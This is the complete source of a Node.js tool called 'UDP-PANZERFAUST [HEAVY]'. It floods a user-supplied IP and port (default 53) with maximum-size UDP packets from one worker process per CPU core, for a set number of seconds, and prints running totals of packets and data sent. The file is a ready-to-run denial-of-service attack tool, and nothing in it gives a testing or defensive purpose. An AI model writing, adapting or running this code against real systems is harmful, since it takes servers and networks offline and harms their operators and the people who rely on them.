const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-panzerfaust-heavy.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

// ========== CONFIG ==========
const payloadSize = 1472; // Max UDP payload (Ethernet MTU)
const cpuCount = os.cpus().length;
const payload = Buffer.alloc(payloadSize); // fast empty buffer

const endTime = Date.now() + duration * 1000;

// ========== FORMATTING ==========
function formatNumber(n) {
  const units = ['', 'K', 'M', 'B', 'T'];
  let i = 0;
  while (n >= 1000 && i < units.length - 1) {
    n /= 1000;
    i++;
  }
  return `${n.toFixed(2)}${units[i]}`;
}

function formatBytes(bytes) {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
  let i = 0;
  while (bytes >= 1024 && i < units.length - 1) {
    bytes /= 1024;
    i++;
  }
  return `${bytes.toFixed(2)} ${units[i]}`;
}

// ========== MASTER ==========
if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytes = 0;

  console.clear();
  console.log('UDP-PANZERFAUST [HEAVY]');
  console.log('--------------------------------------');
  console.log(`Target:                ${target}:${port}`);
  console.log(`Duration:              ${duration}s`);
  console.log(`Payload:               ${payloadSize} bytes`);
  console.log(`Cores:                 ${cpuCount}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        totalBytes += msg.bytes;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('UDP-PANZERFAUST [HEAVY]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
    console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
    console.log(`Target:                ${target}:${port}`);
    console.log(`Payload:               ${payloadSize} bytes`);
    console.log('--------------------------------------');
  }, 5000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

// ========== WORKER ==========
} else {
  const sock = dgram.createSocket('udp4');

  sock.bind(() => {
    sock.setSendBufferSize(4 * 1024 * 1024); // 4MB socket buffer
  });

  let sent = 0;
  let bytes = 0;

  function flood() {
    function loop() {
      if (Date.now() > endTime) return;

      for (let i = 0; i < 100; i++) {
        sock.send(payload, port, target);
        sent++;
        bytes += payloadSize;
      }

      setImmediate(loop);
    }

    loop();
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bytes });
    sent = 0;
    bytes = 0;
  }, 1000);

  flood();
}
